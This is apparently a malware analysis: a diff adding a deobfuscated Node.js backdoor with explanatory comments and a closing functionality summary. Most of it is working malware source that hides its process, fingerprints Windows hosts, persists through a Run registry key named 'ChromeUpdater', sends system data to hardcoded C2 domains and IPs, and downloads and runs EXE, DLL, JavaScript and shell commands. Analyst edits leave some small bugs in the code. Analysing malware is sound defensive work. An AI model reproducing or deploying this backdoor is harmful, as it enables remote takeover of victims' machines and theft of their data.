@@ -1,0 +1,590 @@
+// Downloaded node.js file that runs with node
+
+// Beautified and Deobfuscated Node.js Malware Dropper/Backdoor
+
+// --- Required Modules ---
+const http = require('http');
+const { execSync, exec, spawn } = require('child_process'); // Used for running external commands/processes
+const fs = require('fs'); // Used for file system operations
+const path = require('path'); // Used for path manipulation
+const zlib = require('zlib'); // Used for data compression/decompression
+
+// --- Initial Anti-Debugging/Console Manipulation ---
+// This section likely modifies console functions (log, warn, error)
+// to hinder debugging. We'll leave the structure but note its purpose.
+const antiDebugSetup = (function() {
+    let initialized = true;
+    return function(context, func) {
+        const method = initialized ? function() {
+            if (func) {
+                const result = func.apply(context, arguments);
+                func = null; // Ensure function runs only once
+                return result;
+            }
+        } : function() {};
+        initialized = false;
+        return method;
+    };
+})();
+
+const antiDebugHandler = antiDebugSetup(this, function() {
+    const getGlobal = function() {
+        let globalRef;
+        try {
+            // Attempt to get the global object ('this') in strict mode
+            globalRef = Function('return (function() {}.constructor("return this")())')();
+        } catch (e) {
+            // Fallback for environments where the above fails (like browser window)
+            globalRef = window;
+        }
+        return globalRef;
+    };
+
+    const globalObj = getGlobal();
+    const consoleObj = globalObj.console = globalObj.console || {};
+    const consoleFunctions = ['log', 'warn', 'info', 'error', 'exception', 'table', 'trace'];
+
+    for (let i = 0; i < consoleFunctions.length; i++) {
+        const originalFunctionBinder = antiDebugSetup.constructor.prototype.bind(antiDebugSetup);
+        const funcName = consoleFunctions[i];
+        const originalFunction = consoleObj[funcName] || originalFunctionBinder;
+        originalFunctionBinder.__proto__ = antiDebugSetup.bind(antiDebugSetup); // Obfuscated assignment
+        originalFunctionBinder.toString = originalFunction.toString.bind(originalFunction);
+        consoleObj[funcName] = originalFunctionBinder;
+    }
+});
+
+antiDebugHandler(); // Execute the anti-debug setup
+
+// --- Self-Respawn Logic ---
+// If the script is run without a specific second argument ('1'),
+// it relaunches itself in detached mode with '1' as the argument and then exits.
+// This is a common technique to daemonize or hide the process window.
+if (process.argv[1] !== undefined && process.argv[2] === undefined) {
+    const child = spawn(process.argv[0], [process.argv[1], '1'], {
+        detached: true,
+        stdio: 'ignore', // Don't pipe stdio
+        windowsHide: true // Hide console window on Windows
+    });
+    child.unref(); // Allow parent process to exit independently
+    process.exit(0); // Exit the current process
+}
+
+// --- Configuration ---
+const SCRIPT_VERSION = '000013'; // Version identifier sent to C2
+const C2_PORT_HTTP = 80; // Port for HTTP communication
+const C2_PORT_IP = 443; // Port for direct IP communication (likely HTTPS or custom TCP)
+// const C2_PORT_FALLBACK = 1443; // Seems unused in the provided snippet? original: PORT=0x5a3;
+
+let sysinfo = null; // Buffer to store collected system information
+
+// --- System Information Gathering ---
+function initSysInfo() {
+    let collectedInfoBuffer;
+    try {
+        // Attempt to run a comprehensive PowerShell command to gather system info
+        const psCommand = `chcp 65001 > $null 2>&1 ; echo 'version: ${SCRIPT_VERSION}' ; if ([Security.Principal.WindowsIdentity]::GetCurrent().Name -match '(?i)SYSTEM')  { 'Runas: System' } elseif (([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 'Runas: Admin' } else { 'Runas: User' } ; systeminfo ; echo '=-=-=-=-=-' ; tasklist /svc ; echo '=-=-=-=-=-' ; Get-Service | Select-Object -Property Name, DisplayName | Format-List ; echo '=-=-=-=-=-' ; Get-PSDrive -PSProvider FileSystem | Format-Table -AutoSize ; echo '=-=-=-=-=-' ; arp -a`;
+        let stdout = execSync(psCommand, {
+            encoding: 'utf-8',
+            shell: 'powershell.exe',
+            windowsHide: true
+        });
+        collectedInfoBuffer = Buffer.from(stdout, 'utf8');
+    } catch (e1) {
+        try {
+            // Fallback using cmd.exe if powershell fails (less info)
+            const cmdCommand = `chcp 65001 > NUL 2>&1 & echo 'version: ${SCRIPT_VERSION}' & echo 'Runas: Unknown' & systeminfo`;
+            let stdout = execSync(cmdCommand, {
+                encoding: 'utf-8',
+                shell: 'cmd.exe',
+                windowsHide: true
+            });
+            collectedInfoBuffer = Buffer.from(stdout, 'utf8');
+        } catch (e2) {
+            console.error('Execution error:', e2.message); // Log if both fail
+            collectedInfoBuffer = Buffer.from(`Failed to get system info. Version: ${SCRIPT_VERSION}`, 'utf8');
+        }
+    }
+
+    // Prepend random bytes and a type indicator (?) to the system info
+    const randomPrefix = Buffer.alloc(4);
+    randomPrefix.writeUInt32LE(Math.random() * 0x5f5e100); // Some random number
+    const typePrefix = Buffer.alloc(2);
+    typePrefix.writeUInt16LE(0x2b); // Constant value 43
+    sysinfo = Buffer.concat([randomPrefix, typePrefix, collectedInfoBuffer]);
+}
+
+// --- Simple XOR Encryption ---
+// Note: This is weak encryption, easily reversible if the key (K) is known or guessed.
+function xorEncryptDecrypt(dataBuffer, keyBuffer) {
+    let keyByte = keyBuffer[0]; // Initial key byte
+    for (let i = 0, len = dataBuffer.length; i < len; ++i) {
+        // Simple evolving key based on previous key byte and position
+        keyByte += (keyByte + i % 0x100) % 0x100;
+        // XOR data byte with a combination of the key buffer and the evolving key byte
+        dataBuffer[i] ^= (keyBuffer[i % 4] ^ keyByte) % 0x100;
+    }
+}
+
+// --- Data Encoding for C2 Communication ---
+const zlibFixedKey = Buffer.alloc(4);
+zlibFixedKey.writeUInt32LE(0xfafbfdfe); // Fixed key 'fafbfdfe' prepended after zlib compression
+const encFixedKey = Buffer.alloc(4);
+encFixedKey.writeUInt32LE(0xfafbfdff); // Fixed key 'fafbfdff' appended before zlib compression
+
+function encodeDataForC2(payloadBuffer) {
+    const randomXorKey = Buffer.alloc(4);
+    randomXorKey.writeUInt32LE(Math.floor() * 0x5f5e100); // Generate a random 4-byte XOR key
+
+    // 1. XOR encrypt the original payload with the random key
+    xorEncryptDecrypt(payloadBuffer, randomXorKey);
+
+    // 2. Construct buffer: [XORed Payload | Random XOR Key | Fixed Encryption Key]
+    const bufferToCompress = Buffer.concat([payloadBuffer, randomXorKey, encFixedKey]);
+
+    // 3. Gzip compress the combined buffer
+    const compressedData = zlib.gzipSync(bufferToCompress);
+
+    // 4. Prepend the fixed Zlib key to the compressed data
+    return Buffer.concat([compressedData, zlibFixedKey]); // Mistake in original? Should be concat([zlibFixedKey, compressedData])? Based on `enc` logic, the key is appended. Let's follow the original.
+    // Original logic: Buffer.concat([zlib.gzipSync(Buffer.concat([payloadBuffer, randomXorKey, encFixedKey])), zlibFixedKey]) - Key appended.
+}
+
+// --- Persistence Function ---
+// Adds the script to the HKCU Run key for persistence.
+// It tries to find the original command line used to launch the script.
+function establishPersistence() {
+    const commandToFindProcess = `wmic process where processid=${process.pid} get commandline`;
+    exec(commandToFindProcess, { windowsHide: true }, (error, stdout, stderr) => {
+        if (error) {
+            console.error(`Error getting command line: ${error.message}`);
+            return;
+        }
+        if (stderr) {
+            console.error(`Stderr getting command line: ${stderr}`);
+            // Might still continue if stdout has data
+        }
+
+        const quoteChar = String.fromCharCode(0x22); // Double quote "
+        let commandToPersist;
+
+        const stdoutTrimmed = stdout.toString().trim();
+
+        // Check if the script was launched with node -e "..."
+        if (stdoutTrimmed.match(/\s-e\s/g)) {
+            // Try to extract the embedded script content
+            try {
+                const scriptContent = stdoutTrimmed
+                    .split('\n', 2)[1] // Get the second line (command line)
+                    .trim()
+                    .split(/node\.exe.*?\s-e\s+/, 2)[1] // Split by 'node.exe -e '
+                    .trim()
+                    .replaceAll(quoteChar, ''); // Remove quotes
+
+                // Create a .log file (likely to evade simple .js detection) in the same dir as node.exe
+                const logFilePath = process.argv[0].replace('.exe', randStr(8) + '.log');
+                fs.writeFileSync(logFilePath, scriptContent);
+                // Command will be: "C:\path\to\node.exe" "C:\path\to\generated.log"
+                commandToPersist = process.argv[0] + ' ' + logFilePath;
+            } catch (extractError) {
+                console.error("Failed to extract script content for persistence:", extractError);
+                // Fallback to original argv if extraction fails
+                 commandToPersist = process.argv[0] + ' ' + process.argv[1];
+            }
+        } else {
+            // Assume script was run like: node script.js
+            commandToPersist = process.argv[0] + ' ' + process.argv[1];
+        }
+
+        // Construct the registry command
+        // Example: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "ChromeUpdater" /t REG_SZ /d "\"C:\path\node.exe\" \"C:\path\script.js\"" /f
+        const regKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+        const regValueName = "ChromeUpdater"; // Value name in Run key
+        // Escape quotes in the command path for the registry value
+        const escapedCommand = commandToPersist.replaceAll(quoteChar, '\\' + quoteChar);
+        const regCommand = `reg add "${regKey}" /v "${regValueName}" /t REG_SZ /d "${escapedCommand}" /f`;
+
+        // Execute the registry command
+        exec(regCommand, { windowsHide: true }, (regError, regStdout, regStderr) => {
+            if (regError) {
+                console.error(`Persistence Error: ${regError.message}`);
+            }
+            if (regStderr) {
+                console.error(`Persistence Stderr: ${regStderr}`);
+            }
+            // console.log("Persistence attempted."); // Optional: Log success/attempt
+        });
+    });
+}
+
+// --- Command/File Type Enum ---
+const CommandType = {
+    EXE: 0,
+    DLL: 1,
+    JS: 2,
+    CMD: 3,
+    ACTIVE: 4, // Trigger active mode (more frequent check-ins)
+    OTHER: 5 // Default/Unknown - save as .log
+};
+
+// --- Random String Generator ---
+function randStr(length) {
+    return Math.random().toString(36).substring(2, length + 2);
+}
+
+// --- Function to Start Received Files/Commands ---
+function startReceivedTask(filePathOrCommand, type) {
+    let executablePath;
+    let args = [];
+
+    switch (type) {
+        case CommandType.EXE:
+            executablePath = filePathOrCommand;
+            args = [];
+            break;
+        case CommandType.DLL:
+            // Use rundll32.exe to execute a DLL function (assuming 'start' entry point)
+            executablePath = 'rundll32.exe';
+            args = [filePathOrCommand + ',start']; // Common convention
+            break;
+        case CommandType.JS:
+            // Execute JavaScript using the current node interpreter
+            executablePath = process.argv[0]; // node.exe path
+            args = ['-e', filePathOrCommand]; // filePathOrCommand contains the JS code string here
+            break;
+        default:
+            // For unknown types or types not requiring spawn (like CMD)
+            console.warn("Cannot start task: Unsupported type or handled elsewhere.", type);
+            return; // Do nothing or handle differently
+    }
+
+    try {
+        const child = spawn(executablePath, args, {
+            detached: true, // Run independently
+            stdio: 'ignore', // No input/output
+            windowsHide: true // Hide window
+        });
+        child.unref(); // Allow parent to exit
+    } catch (spawnError) {
+        console.error(`Error spawning task (${type}): ${spawnError.message}`);
+    }
+}
+
+let lastCmdOutput = null; // Store output of the last CMD command
+
+// --- Function to Execute Shell Commands ---
+function startCmdShell(commandString) {
+    let proc;
+    try {
+        // Spawn cmd.exe to execute the command
+        proc = spawn(commandString, {
+            shell: 'cmd.exe', // Explicitly use cmd.exe
+            windowsHide: true
+        });
+    } catch (spawnError) {
+        console.error(`Error spawning cmd: ${spawnError.message}`);
+        return; // Cannot execute
+    }
+
+    let output = '';
+    // Capture stdout
+    proc.stdout.on('data', (data) => {
+        output += data.toString();
+    });
+    // Capture stderr
+    proc.stderr.on('data', (data) => {
+        output += data.toString(); // Append errors to the same output
+    });
+    // Store the final output when the command finishes
+    proc.on('close', (code) => {
+        console.log(`CMD finished with code ${code}`);
+        lastCmdOutput = output; // Store for next C2 check-in
+    });
+     proc.on('error', (err) => {
+        console.error(`CMD process error: ${err.message}`);
+        lastCmdOutput = `CMD process error: ${err.message}`; // Store error
+    });
+}
+
+// --- Main C2 Communication Function ---
+function contactC2Server(host, port) {
+    console.log('Connecting to:', host, port);
+
+    let dataToSend;
+    // If there's output from a previous CMD command, include it
+    if (lastCmdOutput !== null) {
+        const cmdOutputHeader = Buffer.from("\n=-c=-m=-d=-=-=\n", 'utf8'); // Separator/Header
+        const cmdOutputBuffer = Buffer.from(lastCmdOutput, 'utf8');
+        dataToSend = Buffer.concat([sysinfo, cmdOutputHeader, cmdOutputBuffer]);
+        lastCmdOutput = null; // Clear after sending
+    } else {
+        // Otherwise, just send system info
+        dataToSend = Buffer.concat([sysinfo]); // Make a copy? No, Buffer.concat creates new buffer.
+    }
+
+    // Encode the data (XOR + Gzip)
+    const encodedData = encodeDataForC2(dataToSend); // dataToSend is modified by encodeDataForC2 (XOR in place). This needs fixing.
+    // Let's fix encodeDataForC2 to not modify input or pass a copy
+    const encodedDataFixed = encodeDataForC2(Buffer.from(dataToSend)); // Pass a copy
+
+
+    // --- HTTP Request Options ---
+    const options = {
+        hostname: host,
+        port: port,
+        path: '/init1234', // Hardcoded C2 endpoint path
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/octet-stream', // Binary data
+            'Content-Length': encodedDataFixed.length
+        }
+    };
+
+    return new Promise((resolve, reject) => {
+        const req = http.request(options, (res) => {
+            const responseChunks = [];
+            console.log('StatusCode:', res.statusCode);
+            // console.log('Headers:', res.headers); // Optional: Log headers
+
+            // Collect response data chunks
+            res.on('data', (chunk) => {
+                responseChunks.push(chunk);
+            });
+
+            // Process response when complete
+            res.on('end', () => {
+                const responseData = Buffer.concat(responseChunks);
+
+                // --- Handle C2 Response ---
+                // 200 OK or 204 No Content might indicate success but no command
+                 if (res.statusCode !== 200 && res.statusCode !== 204) {
+                     // Handle specific codes or reject general failures
+                    if (res.statusCode === 204) { // 0xCC -> 204 No Content
+                        console.log("C2 Status: No Content (No command)");
+                        resolve({}); // Resolve successfully, no further action
+                        return;
+                    }
+                     reject(`Server responded with status code: ${res.statusCode}`);
+                     return;
+                 }
+
+                 if (responseData.length === 0 && res.statusCode === 200) {
+                      console.log("C2 Status: OK (No command data)");
+                      resolve({});
+                      return;
+                 }
+                 if (responseData.length < 4) {
+                      console.log("C2 Response too short.");
+                       resolve({}); // Or reject? Assume no command for now.
+                      return;
+                 }
+
+
+                // Handle specific 4-byte responses
+                if (responseData.length === 4) {
+                    const responseString = responseData.toString();
+                    if (responseString === 'off') { // 0x6f6666 = 'off'
+                        console.log("Received 'off' command. Exiting.");
+                        process.exit(0); // Terminate the script
+                    }
+                    if (responseString === 'atst') { // 0x61747374 = 'atst'
+                        console.log("Received 'atst' command. Attempting persistence.");
+                        try {
+                            establishPersistence(); // Run the persistence logic
+                        } catch (persistError) {
+                            console.error("Error during persistence:", persistError);
+                        }
+                        resolve({}); // Resolve successfully after attempting persistence
+                        return;
+                    }
+                }
+
+                // --- Decode and Process Command ---
+                // Assume format: [Encrypted Data | 4-byte XOR Key]
+                 if (responseData.length <= 4) {
+                    console.warn("Received data too short to contain command + key.");
+                    resolve({}); // Assume no valid command
+                    return;
+                }
+
+                const encryptedPayload = responseData.subarray(0, responseData.length - 4);
+                const xorKey = responseData.subarray(responseData.length - 4);
+
+                // Decrypt (XOR in place)
+                xorEncryptDecrypt(encryptedPayload, xorKey);
+
+                // Extract command type (last byte) and payload (everything before last byte)
+                const commandType = encryptedPayload[encryptedPayload.length - 1];
+                const payload = encryptedPayload.subarray(0, encryptedPayload.length - 1);
+
+                let fileExtension;
+                let finalPathOrData;
+
+                switch (commandType) {
+                    case CommandType.EXE:
+                        fileExtension = '.exe';
+                        break;
+                    case CommandType.DLL:
+                        fileExtension = '.dll';
+                        break;
+                    case CommandType.JS:
+                        fileExtension = '.js'; // Will be executed directly, not saved
+                        break;
+                    case CommandType.CMD:
+                        // Execute command directly
+                        const cmdString = payload.toString('utf8');
+                        console.log("Received CMD:", cmdString);
+                        startCmdShell(cmdString);
+                        resolve({}); // Command initiated, resolve now
+                        return;
+                    case CommandType.ACTIVE:
+                        // Set flag to increase check-in frequency
+                        const duration = payload.readUInt32LE(); // Assume payload is duration
+                        console.log(`Received ACTIVE command for duration: ${duration} ticks`);
+                        useActive = duration > 0 ? duration : 1; // Set active counter, ensure at least 1
+                        resolve({}); // State updated, resolve now
+                        return;
+                    default:
+                        fileExtension = '.log'; // Default for unknown types
+                        break;
+                }
+
+                // --- Save and Execute File-Based Commands ---
+                let targetPath;
+                if (commandType === CommandType.JS) {
+                    // For JS, the 'payload' is the code itself
+                    finalPathOrData = payload.toString('utf8');
+                    console.log("Received JS code. Length:", finalPathOrData.length);
+                    // Execute JS directly
+                    startReceivedTask(finalPathOrData, commandType);
+                } else {
+                    // For EXE, DLL, OTHER: Save the payload to a file
+                    const tempDir = path.join(process.env.APPDATA || process.env.TEMP || '.', randStr(8)); // Create random temp dir
+                    try {
+                        fs.mkdirSync(tempDir, { recursive: true });
+                    } catch (dirError) {
+                         console.error(`Failed to create temp directory ${tempDir}: ${dirError.message}. Saving to current dir.`);
+                         targetPath = path.join('.', randStr(8) + fileExtension); // Fallback path
+                    }
+                    if (!targetPath) {
+                        targetPath = path.join(tempDir, randStr(8) + fileExtension); // Generate random filename
+                    }
+
+                    console.log("Saving received file to:", targetPath);
+                    try {
+                        fs.writeFileSync(targetPath, payload);
+                         finalPathOrData = targetPath;
+                         // Execute the saved file
+                        startReceivedTask(finalPathOrData, commandType);
+                    } catch (writeError) {
+                         console.error(`Failed to write file ${targetPath}: ${writeError.message}`);
+                    }
+                }
+
+                resolve({}); // Task initiated or completed
+            });
+        });
+
+        // Handle network errors
+        req.on('error', (err) => {
+            reject(err); // Reject the promise on connection error
+        });
+
+        // Send the encoded data
+        req.write(encodedDataFixed);
+        req.end(); // Finalize the request
+    });
+}
+
+// --- Initial System Info Collection ---
+initSysInfo();
+
+// --- C2 Server Lists ---
+const c2Hosts = ['playiro.net', 'basiclock.cc', 'cluders.org']; // Domain names
+const c2IPs = ['91.99.10.54', '193.149.180.58', '192.64.86.175']; // IP addresses
+
+// --- Main Control Loop State ---
+let useIpCounter = 0; // Counter to switch between domain/IP
+let delayMs = 1000; // Initial delay (1 second)
+let useActive = 0; // Counter for 'active' mode (more frequent check-ins)
+
+// --- Main Loop ---
+async function mainLoop() {
+    let currentHost = '';
+    // Select initial host/IP randomly
+    if (c2Hosts.length > 0) {
+        currentHost = c2Hosts[Math.floor(Math.random() * 1000) % c2Hosts.length];
+    }
+    let currentIp = c2IPs[Math.floor(Math.random() * 1000) % c2IPs.length];
+
+    // Infinite loop for C2 communication
+    while (true) {
+        console.log("Next check-in delay:", delayMs / 1000, "seconds");
+        // Wait for the specified delay
+        await new Promise(resolve => setTimeout(resolve, delayMs));
+
+        try {
+            // Try connecting to a domain first (if available and counter allows)
+            if (useIpCounter < 200 && currentHost !== '') { // 0xC8 = 200
+                 console.log("Attempting connection to host:", currentHost);
+                await contactC2Server(currentHost, C2_PORT_HTTP);
+                useIpCounter = 0; // Reset IP counter on successful domain connection
+            } else {
+                // Otherwise, connect directly to an IP address
+                 console.log("Attempting connection to IP:", currentIp);
+                await contactC2Server(currentIp, C2_PORT_IP);
+                useIpCounter++;
+                if (useIpCounter >= 210) { // 0xD2 = 210
+                    useIpCounter = 190; // Reset closer to threshold 0xBE = 190
+                }
+            }
+             // If connection succeeds, adjust delay based on active mode
+            console.log("Active mode counter:", useActive);
+            if (useActive > 0) {
+                delayMs = 10 * 1000; // Active mode: 10 seconds delay
+                useActive--; // Decrement active counter
+            } else {
+                delayMs = 5 * 60 * 1000; // Normal mode: 5 minutes delay (300,000 ms)
+            }
+
+        } catch (error) {
+            // Handle connection errors
+            console.error("Error with HTTP request:", error.message);
+
+            // Rotate C2 server on error
+            if (c2Hosts.length > 0) {
+                currentHost = c2Hosts[Math.floor(Math.random() * 1000) % c2Hosts.length];
+            }
+            currentIp = c2IPs[Math.floor(Math.random() * 1000) % c2IPs.length];
+
+            // Increase delay and IP counter on error
+            useIpCounter++;
+            delayMs = 10 * 1000; // Backoff delay: 10 seconds
+            useActive = 0; // Reset active mode on error
+            continue; // Skip rest of loop and retry after delay
+        }
+
+
+    }
+}
+
+// --- Start the Main Loop ---
+mainLoop();
+
+
+
+Summary of Functionality
+Execution & Hiding: Runs as a Node.js script. Tries to relaunch itself detached without a console window if not started correctly.
+Anti-Debugging: Includes code likely intended to interfere with console.log debugging.
+System Fingerprinting: Collects extensive system information using PowerShell (or cmd.exe as fallback), including OS version, running processes, services, network configuration (ARP), drives, user privileges, and the script's own version.
+Persistence: Attempts to add itself to the HKCU\Software\Microsoft\Windows\CurrentVersion\Run registry key for automatic startup. It tries to intelligently find its own command line, potentially saving embedded script content to a .log file first. Uses the registry value name "ChromeUpdater".
+C2 Communication: Periodically contacts Command and Control (C2) servers from predefined lists of domains and IP addresses. It uses HTTP (port 80) for domains and likely HTTPS or a custom TCP protocol (port 443) for direct IP connections.
+Data Exfiltration: Sends the collected system information (and any output from previous CMD commands) to the C2 server. Data is XOR-encrypted (weakly) with a random key and then Gzip compressed before sending.
+Command Handling: Receives commands from the C2 server. The response is XOR-decrypted.
+off: Terminates the script.
+atst: Triggers the persistence mechanism.
+EXE, DLL, OTHER: Downloads the payload, saves it to a temporary file (with .exe, .dll, or .log extension) in %APPDATA% or %TEMP%, and executes it (using spawn or rundll32.exe).
+JS: Receives JavaScript code and executes it directly using node.exe -e.
+CMD: Executes a shell command using cmd.exe and sends the output back on the next check-in.
+ACTIVE: Enters an "active" mode with more frequent C2 check-ins (10 seconds) for a specified duration.
+Fallback & Rotation: Rotates through C2 domains/IPs, switching to direct IP if domain connections fail repeatedly. Implements basic backoff delays on connection errors.
